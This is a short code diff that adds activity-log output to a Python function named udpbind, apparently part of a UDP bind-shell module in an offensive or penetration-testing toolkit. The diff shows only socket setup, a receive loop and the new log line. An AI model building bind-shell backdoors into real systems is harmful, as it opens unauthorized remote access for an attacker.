@@ -14,6 +14,8 @@ def udpbind():
 # Create socket and bind to address
     UDPSock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
     UDPSock.bind(addr)
+    if Logging == "yes":
+        write2file(ActivityLog, "\n\n [ UDP Bindshell module executed ]")
 
     while 1:
         data,addr = UDPSock.recvfrom(buf)
